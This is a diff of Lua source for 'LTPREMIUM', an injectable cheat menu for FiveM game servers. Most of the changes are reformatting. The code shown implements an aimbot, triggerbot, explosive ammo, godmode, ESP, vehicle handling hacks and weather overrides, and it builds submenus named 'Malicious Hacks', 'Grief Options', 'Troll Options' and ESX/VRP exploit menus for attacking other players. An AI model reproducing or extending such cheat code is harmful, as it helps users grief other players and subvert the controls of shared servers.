-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
-                                  
-                            end
-                            for i, dA in pairs(be) do 
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
-                                
-                            end       
-                            Citizen.Wait(50)                  
-                            for i = 0, #allMenus do
-                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
-                            end
-                            for i, dA in pairs(bd) do
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
-                                  
-                            end
-                            for i, dA in pairs(be) do 
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
-                                
-                            end       
-                            Citizen.Wait(50)                  
-                            for i = 0, #allMenus do
-                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
-                            end
-                            for i, dA in pairs(bd) do
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
-                                  
-                            end
-                            for i, dA in pairs(be) do 
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
-                                
-                            end                          
+                for i, dA in pairs(bd) do
+                    LTPREMIUM.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                 end
-			
-			if explosiveAmmo then
-                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
-                if impact1 then
-                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
-					Citizen.Wait(-1000)
-					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
-					Citizen.Wait(-1000)
-					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
-					Citizen.Wait(150)
-					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
-					Citizen.Wait(150)
-					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                for i, dA in pairs(be) do
+                    LTPREMIUM.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                 end
             end
 
-			if RainbowVeh then
+            if animated then
+                Citizen.Wait(50)
+                for i = 0, #allMenus do
+                    LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1")
+                end
+                for i, dA in pairs(bd) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1")
+                end
+                for i, dA in pairs(be) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1")
+                end
+                Citizen.Wait(50)
+                for i = 0, #allMenus do
+                    LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2")
+                end
+                for i, dA in pairs(bd) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2")
+                end
+                for i, dA in pairs(be) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2")
+                end
+                Citizen.Wait(50)
+                for i = 0, #allMenus do
+                    LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3")
+                end
+                for i, dA in pairs(bd) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3")
+                end
+                for i, dA in pairs(be) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3")
+                end
+                Citizen.Wait(50)
+                for i = 0, #allMenus do
+                    LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4")
+                end
+                for i, dA in pairs(bd) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4")
+                end
+                for i, dA in pairs(be) do
+                    LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4")
+                end
+            end
+
+            if explosiveAmmo then
+                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
+                if impact1 then
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                    Citizen.Wait(-1000)
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                    Citizen.Wait(-1000)
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                    Citizen.Wait(150)
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                    Citizen.Wait(150)
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                end
+            end
+
+            if RainbowVeh then
                 local u48y34 = k(1.0)
                 SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                 SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
             end
-			
-			if ou328hSync then
+
+            if ou328hSync then
                 local u48y34 = k(1.0)
-				local ped = PlayerPedId()
+                local ped = PlayerPedId()
                 local veh = GetVehiclePedIsUsing(ped)
                 SetVehicleNeonLightEnabled(veh, 0, true)
                 SetVehicleNeonLightEnabled(veh, 0, true)
                 SetVehicleNeonLightEnabled(veh, 1, true)
                 SetVehicleNeonLightEnabled(veh, 2, true)
                 SetVehicleNeonLightEnabled(veh, 3, true)
-				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                 SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                 SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
             end
-			
-			
-			if ou328hNeon then
+
+
+            if ou328hNeon then
                 local u48y34 = k(1.0)
-		    local ped = PlayerPedId()
-            local veh = GetVehiclePedIsUsing(ped)
+                local ped = PlayerPedId()
+                local veh = GetVehiclePedIsUsing(ped)
                 SetVehicleNeonLightEnabled(veh, 0, true)
                 SetVehicleNeonLightEnabled(veh, 0, true)
                 SetVehicleNeonLightEnabled(veh, 1, true)
@@ -5229,52 +5355,52 @@ Citizen.CreateThread(
                 SetVehicleNeonLightEnabled(veh, 3, true)
                 SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
             end
-			
-			if LOJWDNDDNDN then
+
+            if LOJWDNDDNDN then
                 local u48y34 = k(1.0)
-		    local ped = PlayerPedId()
-            local veh = GetVehiclePedIsUsing(ped)
-               SetVehicleDirtLevel(veh, 1.0)
-				else
+                local ped = PlayerPedId()
+                local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleDirtLevel(veh, 1.0)
+            else
             end
-			
-			if CLEAR then
-								SetWeatherTypePersist("CLEAR")
-        SetWeatherTypeNowPersist("CLEAR")
-        SetWeatherTypeNow("CLEAR")
-        SetOverrideWeather("CLEAR")
-		end
-		
-					if BLIZZARD then
-								SetWeatherTypePersist("BLIZZARD")
-        SetWeatherTypeNowPersist("BLIZZARD")
-        SetWeatherTypeNow("BLIZZARD")
-        SetOverrideWeather("BLIZZARD")
-		end
-		
-					if FOGGY then
-								SetWeatherTypePersist("FOGGY")
-        SetWeatherTypeNowPersist("FOGGY")
-        SetWeatherTypeNow("FOGGY")
-        SetOverrideWeather("FOGGY")
-		end
-		
-					if EXTRASUNNY then
-								SetWeatherTypePersist("EXTRASUNNY")
-        SetWeatherTypeNowPersist("EXTRASUNNY")
-        SetWeatherTypeNow("EXTRASUNNY")
-        SetOverrideWeather("EXTRASUNNY")
-		end
-			
-			if XMAS then
-			            SetForceVehicleTrails(true)
-            SetForcePedFootstepsTracks(true)
-					SetWeatherTypePersist("XMAS")
-        SetWeatherTypeNowPersist("XMAS")
-        SetWeatherTypeNow("XMAS")
-        SetOverrideWeather("XMAS")
-		end
-			
+
+            if CLEAR then
+                SetWeatherTypePersist("CLEAR")
+                SetWeatherTypeNowPersist("CLEAR")
+                SetWeatherTypeNow("CLEAR")
+                SetOverrideWeather("CLEAR")
+            end
+
+            if BLIZZARD then
+                SetWeatherTypePersist("BLIZZARD")
+                SetWeatherTypeNowPersist("BLIZZARD")
+                SetWeatherTypeNow("BLIZZARD")
+                SetOverrideWeather("BLIZZARD")
+            end
+
+            if FOGGY then
+                SetWeatherTypePersist("FOGGY")
+                SetWeatherTypeNowPersist("FOGGY")
+                SetWeatherTypeNow("FOGGY")
+                SetOverrideWeather("FOGGY")
+            end
+
+            if EXTRASUNNY then
+                SetWeatherTypePersist("EXTRASUNNY")
+                SetWeatherTypeNowPersist("EXTRASUNNY")
+                SetWeatherTypeNow("EXTRASUNNY")
+                SetOverrideWeather("EXTRASUNNY")
+            end
+
+            if XMAS then
+                SetForceVehicleTrails(true)
+                SetForcePedFootstepsTracks(true)
+                SetWeatherTypePersist("XMAS")
+                SetWeatherTypeNowPersist("XMAS")
+                SetWeatherTypeNow("XMAS")
+                SetOverrideWeather("XMAS")
+            end
+
             if LOJ38 then
                 for i = 0, 128 do
                     if i ~= PlayerId() then
@@ -5285,11 +5411,13 @@ Citizen.CreateThread(
                             local Dead = IsPlayerDead(TargetPed)
 
                             if Exist and not Dead then
-                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
+                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y,
+                                    TargetPos.z, 0)
                                 if IsEntityVisible(TargetPed) and OnScreen then
                                     if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                         local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
-                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
+                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords
+                                        .z, 1)
                                     end
                                 end
                             end
@@ -5297,40 +5425,40 @@ Citizen.CreateThread(
                     end
                 end
             end
-			
-			if IsControlJustReleased(0, Keys['X']) then
-			ClearPedTasks(PlayerPedId())
-		end
-			
-						if Nigubdddddd then 
-			local veh = GetVehiclePedIsUsing(PlayerPedId(-1))
-			if IsControlPressed(0, 232) then
-			SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
-			end
-				if veh ~= nil then
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
-					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
-					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 36.0)
-					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 60.0);
-				end
-			end
 
-			            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
+            if IsControlJustReleased(0, Keys['X']) then
+                ClearPedTasks(PlayerPedId())
+            end
+
+            if Nigubdddddd then
+                local veh = GetVehiclePedIsUsing(PlayerPedId(-1))
+                if IsControlPressed(0, 232) then
+                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
+                end
+                if veh ~= nil then
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
+                    SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
+                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 36.0)
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 60.0);
+                end
+            end
+
+            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                 if IsControlPressed(0, 209) then
                     SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                 elseif IsControlPressed(0, 210) then
                     SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                 end
             end
-			
+
             if TriggerBot then
                 local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                 if Aiming then
@@ -5347,51 +5475,50 @@ Citizen.CreateThread(
                 SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                 SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
             end
-			
-			if godmode then
-			SetEntityInvincible(GetPlayerPed(-1), true)
-			SetPlayerInvincible(PlayerId(), true)
-			SetPedCanRagdoll(GetPlayerPed(-1), false)
-			ClearPedBloodDamage(GetPlayerPed(-1))
-			ResetPedVisibleDamage(GetPlayerPed(-1))
-			ClearPedLastWeaponDamage(GetPlayerPed(-1))
-			SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
-			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
-			SetEntityCanBeDamaged(GetPlayerPed(-1), false)
-		else
-			SetEntityInvincible(GetPlayerPed(-1), false)
-			SetPlayerInvincible(PlayerId(), false)
-			SetPedCanRagdoll(GetPlayerPed(-1), true)
-			ClearPedLastWeaponDamage(GetPlayerPed(-1))
-			SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
-			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
-			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
-		end
 
-		if discordPresence then
-                    SetDiscordAppId(628637344098025482)
-            
-                    SetDiscordRichPresenceAsset('LTMENU Premium')
-                    
-					SetRichPresence('LTMENU')
-			
-                    SetDiscordRichPresenceAssetText('LTMENU Premium | Lol Fuck you')
-                
-                    SetDiscordRichPresenceAssetSmall('LTMENU Premium')
-            
-                    SetDiscordRichPresenceAssetSmallText('LTMENU ON YOUTUBE')
-            
-                end
-		
+            if godmode then
+                SetEntityInvincible(GetPlayerPed(-1), true)
+                SetPlayerInvincible(PlayerId(), true)
+                SetPedCanRagdoll(GetPlayerPed(-1), false)
+                ClearPedBloodDamage(GetPlayerPed(-1))
+                ResetPedVisibleDamage(GetPlayerPed(-1))
+                ClearPedLastWeaponDamage(GetPlayerPed(-1))
+                SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
+                SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
+                SetEntityCanBeDamaged(GetPlayerPed(-1), false)
+            else
+                SetEntityInvincible(GetPlayerPed(-1), false)
+                SetPlayerInvincible(PlayerId(), false)
+                SetPedCanRagdoll(GetPlayerPed(-1), true)
+                ClearPedLastWeaponDamage(GetPlayerPed(-1))
+                SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
+                SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
+                SetEntityCanBeDamaged(GetPlayerPed(-1), true)
+            end
+
+            if discordPresence then
+                SetDiscordAppId(628637344098025482)
+
+                SetDiscordRichPresenceAsset('LTMENU Premium')
+
+                SetRichPresence('LTMENU')
+
+                SetDiscordRichPresenceAssetText('LTMENU Premium | Lol Fuck you')
+
+                SetDiscordRichPresenceAssetSmall('LTMENU Premium')
+
+                SetDiscordRichPresenceAssetSmallText('LTMENU ON YOUTUBE')
+            end
+
             if SuperJump then
                 SetSuperJumpThisFrame(PlayerId())
             end
-			
-			if ePunch then
-				SetExplosiveMeleeThisFrame(PlayerId())
-			end
-			
-			if NOXJDSS then
+
+            if ePunch then
+                SetExplosiveMeleeThisFrame(PlayerId())
+            end
+
+            if NOXJDSS then
                 local cI = {
                     [453432689] = 1.0,
                     [3219281620] = 1.0,
@@ -5513,18 +5640,17 @@ Citizen.CreateThread(
     end)
 Citizen.CreateThread(
     function()
-
         local currentTint = 1
         local selectedTint = 1
 
         LTPREMIUM.CreateMenu("MainMenu", "LTPREMIUM")
         LTPREMIUM.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
-		LTPREMIUM.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
+        LTPREMIUM.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
         LTPREMIUM.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
         LTPREMIUM.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
         LTPREMIUM.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
         LTPREMIUM.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
-		LTPREMIUM.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
+        LTPREMIUM.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
         LTPREMIUM.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
         LTPREMIUM.CreateSubMenu("GriefMenu", "MainMenu", "Grief Options")
         LTPREMIUM.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
@@ -5533,17 +5659,17 @@ Citizen.CreateThread(
         LTPREMIUM.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
         LTPREMIUM.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
         LTPREMIUM.CreateSubMenu("CreditsMenu", "MainMenu", "Credits Menu")
-		LTPREMIUM.CreateSubMenu("Hedit", "VehMenu", "Handling")
+        LTPREMIUM.CreateSubMenu("Hedit", "VehMenu", "Handling")
         LTPREMIUM.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
         LTPREMIUM.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
-		LTPREMIUM.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
+        LTPREMIUM.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
         LTPREMIUM.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
         LTPREMIUM.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
         LTPREMIUM.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
         LTPREMIUM.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
         LTPREMIUM.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
-		LTPREMIUM.CreateSubMenu("AI", "MainMenu", "AI Menu")
-        LTPREMIUM.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options") 
+        LTPREMIUM.CreateSubMenu("AI", "MainMenu", "AI Menu")
+        LTPREMIUM.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
         LTPREMIUM.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
         LTPREMIUM.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
         LTPREMIUM.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
@@ -5556,307 +5682,315 @@ Citizen.CreateThread(
         LTPREMIUM.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
         LTPREMIUM.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
         LTPREMIUM.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
-		LTPREMIUM.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
+        LTPREMIUM.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
         LTPREMIUM.CreateSubMenu("performance", "LSC", "Performance Tuning")
         LTPREMIUM.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
         LTPREMIUM.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
         LTPREMIUM.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
-		LTPREMIUM.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
+        LTPREMIUM.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
         LTPREMIUM.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
-		LTPREMIUM.CreateSubMenu("Credits", "SettingsMenu", "Credits")
-for i, dA in pairs(bd) do 
-                LTPREMIUM.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
-                LTPREMIUM.CreateSubMenu("primary", dA.id, "Primary Paint") 
-                LTPREMIUM.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
-                LTPREMIUM.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
-                LTPREMIUM.CreateSubMenu("classic1", "primary", "Classic Paint") 
-                LTPREMIUM.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
-                LTPREMIUM.CreateSubMenu("matte1", "primary", "Matte Paint") 
-                LTPREMIUM.CreateSubMenu("metal1", "primary", "Metal Paint") 
-                LTPREMIUM.CreateSubMenu("classic2", "secondary", "Classic Paint") 
-                LTPREMIUM.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
-                LTPREMIUM.CreateSubMenu("matte2", "secondary", "Matte Paint") 
-                LTPREMIUM.CreateSubMenu("metal2", "secondary", "Metal Paint") 
-                LTPREMIUM.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
-                LTPREMIUM.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
-                LTPREMIUM.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
-                LTPREMIUM.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
-            end 
+        LTPREMIUM.CreateSubMenu("Credits", "SettingsMenu", "Credits")
+        for i, dA in pairs(bd) do
+            LTPREMIUM.CreateSubMenu(dA.id, "tunings", dA.name)
+            if dA.id == "paint" then
+                LTPREMIUM.CreateSubMenu("primary", dA.id, "Primary Paint")
+                LTPREMIUM.CreateSubMenu("secondary", dA.id, "Secondary Paint")
+                LTPREMIUM.CreateSubMenu("rimpaint", dA.id, "Wheel Paint")
+                LTPREMIUM.CreateSubMenu("classic1", "primary", "Classic Paint")
+                LTPREMIUM.CreateSubMenu("metallic1", "primary", "Metallic Paint")
+                LTPREMIUM.CreateSubMenu("matte1", "primary", "Matte Paint")
+                LTPREMIUM.CreateSubMenu("metal1", "primary", "Metal Paint")
+                LTPREMIUM.CreateSubMenu("classic2", "secondary", "Classic Paint")
+                LTPREMIUM.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
+                LTPREMIUM.CreateSubMenu("matte2", "secondary", "Matte Paint")
+                LTPREMIUM.CreateSubMenu("metal2", "secondary", "Metal Paint")
+                LTPREMIUM.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
+                LTPREMIUM.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
+                LTPREMIUM.CreateSubMenu("matte3", "rimpaint", "Matte Paint")
+                LTPREMIUM.CreateSubMenu("metal3", "rimpaint", "Metal Paint")
+            end
         end
-        for i, dA in pairs(be) do 
-            LTPREMIUM.CreateSubMenu(dA.id, "performance", dA.name) 
+        for i, dA in pairs(be) do
+            LTPREMIUM.CreateSubMenu(dA.id, "performance", dA.name)
         end
-    
+
         local SelectedPlayer
-    
-            while Enabled do
-    
-                local ped = PlayerPedId() 
-                local veh = GetVehiclePedIsUsing(ped) 
-                SetVehicleModKit(veh, 0) 
-                for i, dA in pairs(bd) do
-                    if LTPREMIUM.IsMenuOpened("tunings") then
-                        if b8 then
-                            if ba == "neon" then 
-                                local r, g, b = table.unpack(b9) 
-                                SetVehicleNeonLightsColour(veh, r, g, b) 
-                                SetVehicleNeonLightEnabled(veh, 0, bc) 
-                                SetVehicleNeonLightEnabled(veh, 1, bc) 
-                                SetVehicleNeonLightEnabled(veh, 2, bc) 
-                                SetVehicleNeonLightEnabled(veh, 3, bc) 
-                                b8 = false 
-                                ba = -1 
-                                b9 = -1 
-                            elseif ba == "paint" then 
-                                local dB, dC, dD, dA = table.unpack(b9) 
-                                SetVehicleColours(veh, dB, dC) 
-                                SetVehicleExtraColours(veh, dD, dA) 
+
+        while Enabled do
+            local ped = PlayerPedId()
+            local veh = GetVehiclePedIsUsing(ped)
+            SetVehicleModKit(veh, 0)
+            for i, dA in pairs(bd) do
+                if LTPREMIUM.IsMenuOpened("tunings") then
+                    if b8 then
+                        if ba == "neon" then
+                            local r, g, b = table.unpack(b9)
+                            SetVehicleNeonLightsColour(veh, r, g, b)
+                            SetVehicleNeonLightEnabled(veh, 0, bc)
+                            SetVehicleNeonLightEnabled(veh, 1, bc)
+                            SetVehicleNeonLightEnabled(veh, 2, bc)
+                            SetVehicleNeonLightEnabled(veh, 3, bc)
+                            b8 = false
+                            ba = -1
+                            b9 = -1
+                        elseif ba == "paint" then
+                            local dB, dC, dD, dA = table.unpack(b9)
+                            SetVehicleColours(veh, dB, dC)
+                            SetVehicleExtraColours(veh, dD, dA)
+                            b8 = false
+                            ba = -1;
+                            b9 = -1
+                        else
+                            if bc == "rm" then
+                                RemoveVehicleMod(veh, ba)
                                 b8 = false
-                                ba = -1; 
+                                ba = -1
                                 b9 = -1
-                            else 
-                                if bc == "rm" then 
-                                    RemoveVehicleMod(veh, ba) 
-                                    b8 = false 
-                                    ba = -1 
-                                    b9 = -1
-                                else 
-                                    SetVehicleMod(veh, ba, b9, false) 
-                                    b8 = false 
-                                    ba = -1 
-                                    b9 = -1 
-                                end 
-                            end 
-                        end 
-                    end
-    
-                    if LTPREMIUM.IsMenuOpened(dA.id) then
-                        if dA.id == "wheeltypes" then
-                            if LTPREMIUM.Button("Sport Wheels") then 
-                                SetVehicleWheelType(veh, 0) 
-                            elseif LTPREMIUM.Button("Muscle Wheels") then 
-                                SetVehicleWheelType(veh, 1) 
-                            elseif LTPREMIUM.Button("Lowrider Wheels") then 
-                                SetVehicleWheelType(veh, 2) 
-                            elseif LTPREMIUM.Button("SUV Wheels") then 
-                                SetVehicleWheelType(veh, 3) 
-                            elseif LTPREMIUM.Button("Offroad Wheels") then 
-                                SetVehicleWheelType(veh, 4) 
-                            elseif LTPREMIUM.Button("Tuner Wheels") then 
-                                SetVehicleWheelType(veh, 5) 
-                            elseif LTPREMIUM.Button("High End Wheels") then 
-                                SetVehicleWheelType(veh, 7) 
+                            else
+                                SetVehicleMod(veh, ba, b9, false)
+                                b8 = false
+                                ba = -1
+                                b9 = -1
                             end
-                                
-                            LTPREMIUM.Display() 
-                        elseif dA.id == "extra" then 
-                            local dF = checkValidVehicleExtras() 
-                            for i, dA in pairs(dF) do
-                                if IsVehicleExtraTurnedOn(veh, i) then 
-                                    pricestring = "Installed"
-                                else 
+                        end
+                    end
+                end
+
+                if LTPREMIUM.IsMenuOpened(dA.id) then
+                    if dA.id == "wheeltypes" then
+                        if LTPREMIUM.Button("Sport Wheels") then
+                            SetVehicleWheelType(veh, 0)
+                        elseif LTPREMIUM.Button("Muscle Wheels") then
+                            SetVehicleWheelType(veh, 1)
+                        elseif LTPREMIUM.Button("Lowrider Wheels") then
+                            SetVehicleWheelType(veh, 2)
+                        elseif LTPREMIUM.Button("SUV Wheels") then
+                            SetVehicleWheelType(veh, 3)
+                        elseif LTPREMIUM.Button("Offroad Wheels") then
+                            SetVehicleWheelType(veh, 4)
+                        elseif LTPREMIUM.Button("Tuner Wheels") then
+                            SetVehicleWheelType(veh, 5)
+                        elseif LTPREMIUM.Button("High End Wheels") then
+                            SetVehicleWheelType(veh, 7)
+                        end
+
+                        LTPREMIUM.Display()
+                    elseif dA.id == "extra" then
+                        local dF = checkValidVehicleExtras()
+                        for i, dA in pairs(dF) do
+                            if IsVehicleExtraTurnedOn(veh, i) then
+                                pricestring = "Installed"
+                            else
+                                pricestring = "Not Installed"
+                            end
+                            if LTPREMIUM.Button(dA.menuName, pricestring) then
+                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
+                            end
+                        end
+
+                        LTPREMIUM.Display()
+                    elseif dA.id == "headlight" then
+                        if LTPREMIUM.Button("None") then
+                            SetVehicleHeadlightsColour(veh, -1)
+                        end
+                        for dK, dA in pairs(bo) do
+                            tp = GetVehicleHeadlightsColour(veh)
+                            if tp == dA.id and not bg then
+                                pricetext = "Installed"
+                            else
+                                if bg and tp == dA.id then
+                                    pricetext = "Previewing"
+                                else
+                                    pricetext = "Not Installed"
+                                end
+                            end
+                            head = GetVehicleHeadlightsColour(veh)
+                            if LTPREMIUM.Button(dA.name, pricetext) then
+                                if not bg then
